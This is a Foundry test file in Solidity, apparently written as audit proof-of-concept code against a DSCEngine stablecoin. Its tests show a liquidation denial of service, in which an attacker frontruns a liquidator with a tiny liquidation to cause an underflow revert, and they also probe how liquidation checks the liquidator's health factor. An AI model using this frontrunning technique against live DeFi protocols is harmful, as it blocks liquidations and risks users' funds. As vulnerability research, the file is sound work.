// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DeployDSCForExploit} from "../../script/DeployDSCForExploit.s.sol";
import {HelperConfigForExploit} from "../../script/HelperConfigForExploit.s.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/token/ERC20DecimalsMock.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";

contract ExploitEngine is Test {

    DSCEngine engine;
    DecentralizedStableCoin dsc;

    DeployDSCForExploit deployer;
    HelperConfigForExploit config;

    address weth;
    address wethUsdPriceFeed;
    address wbtc;
    address wbtcUsdPriceFeed;

    uint256 wethDecimals; // 8
    uint256 wbtcDecimals; // 8

    address alice = makeAddr("alice");
    address exploiter = makeAddr("exploiter");

    uint256 private constant PRECISION = 1e18;
    uint256 private constant FEED_DECIMALS = 1e8;
    uint256 public constant LIQUIDATION_BONUS = 10;
    uint256 private constant MIN_HEALTH_FACTOR = 1e18;
    uint256 private constant LIQUIDATION_THRESHOLD = 50; // 200% overcollateralized
    uint256 private constant LIQUIDATION_PRECISION = 100;
    uint256 private constant ADDITIONAL_FEED_PRECISION = 1e10;  

    uint256 constant STARTING_ERC20_BALANCE = 10 ether;
    uint256 constant AMOUNT_COLLATERAL = 10 ether;

    function setUp() public {
        deployer = new DeployDSCForExploit();
        (dsc, engine, config) = deployer.run();
        (wethUsdPriceFeed,wbtcUsdPriceFeed,weth,wbtc,) = config.activeNetwork();
        ERC20DecimalsMock(weth).mint(alice, STARTING_ERC20_BALANCE);
        ERC20DecimalsMock(wbtc).mint(alice, STARTING_ERC20_BALANCE);

        ERC20DecimalsMock(weth).mint(exploiter, STARTING_ERC20_BALANCE);

        wethDecimals = ERC20DecimalsMock(weth).decimals();
        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();

    }

    function testLiquidateRevertsIfLiquidatorHFBelow1 () public {
        vm.startPrank(alice);
        ERC20DecimalsMock(weth).approve(address(engine), AMOUNT_COLLATERAL);
        uint256 amountToMint = 100 ether; 
        engine.depositCollateralAndMintDsc(weth, AMOUNT_COLLATERAL, amountToMint);
        vm.stopPrank();

        address liquidator = makeAddr("liquidator");
        ERC20DecimalsMock(weth).mint(liquidator, STARTING_ERC20_BALANCE);

        vm.startPrank(liquidator);
        ERC20DecimalsMock(weth).approve(address(engine), AMOUNT_COLLATERAL);
        engine.depositCollateralAndMintDsc(weth, AMOUNT_COLLATERAL, amountToMint);
        vm.stopPrank();

        int256 newEthPrice = 18e8;
        MockV3Aggregator(wethUsdPriceFeed).updateAnswer(newEthPrice);
        assertLt(engine.getHealthFactor(alice), 1e18);
        assertLt(engine.getHealthFactor(liquidator), 1e18);

        vm.startPrank(liquidator);
        dsc.approve(address(engine), 1 ether);


        /**
         * @dev This reverts since liquidator's health factor is below 1.
         */
        vm.expectRevert();
        engine.liquidate(weth, alice, 1 ether);

        vm.stopPrank();

        vm.startPrank(liquidator);
        ERC20DecimalsMock(weth).mint(liquidator, 1000 ether);
        ERC20DecimalsMock(weth).approve(address(engine), 1000 ether);

        engine.depositCollateral(weth, 1000 ether);

        uint256 healthFactorBefore = engine.getHealthFactor(liquidator);
        assertGe(healthFactorBefore, 1e18);


        /**
         * @dev This shows that liquidate doesn't affect liquidator's HF
         */
        dsc.approve(address(engine), 1 ether);
        engine.liquidate(weth, alice, 1 ether);

        assertEq(healthFactorBefore, engine.getHealthFactor(liquidator));

        vm.stopPrank();
        
    }

    function testLiquidationDoS() public {
        address attacker = makeAddr("attacker");
        address liquidator = makeAddr("liquidator");

        ERC20DecimalsMock(weth).mint(alice, 10 ether);
        vm.startPrank(alice);
        ERC20DecimalsMock(weth).approve(address(engine), 10 ether);
        engine.depositCollateralAndMintDsc(weth, 10 ether, 5500 ether);
        vm.stopPrank();

        ERC20DecimalsMock(weth).mint(attacker, 10 ether);
        vm.startPrank(attacker);
        ERC20DecimalsMock(weth).approve(address(engine), 10 ether);
        engine.depositCollateralAndMintDsc(weth, 10 ether, 10 ether);
        dsc.approve(address(engine), 10 ether);
        vm.stopPrank();

        ERC20DecimalsMock(weth).mint(liquidator, 30 ether);
        vm.startPrank(liquidator);
        ERC20DecimalsMock(weth).approve(address(engine), 30 ether);
        engine.depositCollateralAndMintDsc(weth, 30 ether, 10000 ether);
        dsc.approve(address(engine), 10000 ether);
        vm.stopPrank();

        MockV3Aggregator(wethUsdPriceFeed).updateAnswer(1000e8);

        // DoS starts here
        (uint256 dscMinted, uint256 collateralUSD) = engine.getAccountInFormation(alice);
        assertEq(dscMinted, 5500e18);
        assertEq(collateralUSD, 10000e18);
        
        // 1. Assert Alice's position is unhealthy
        uint256 healthFactor = engine.getHealthFactor(alice);
        assertLt(healthFactor, 1e18);

        // 2. Attacker frontruns liquidator's transaction and liquidates 2000wei
        vm.prank(attacker);
        engine.liquidate(weth, alice, 2000);

        // 3. Transaction of liquidator reverts due to underflow
        vm.prank(liquidator);
        vm.expectRevert();
        engine.liquidate(weth, alice, 5500e18);
    }
}
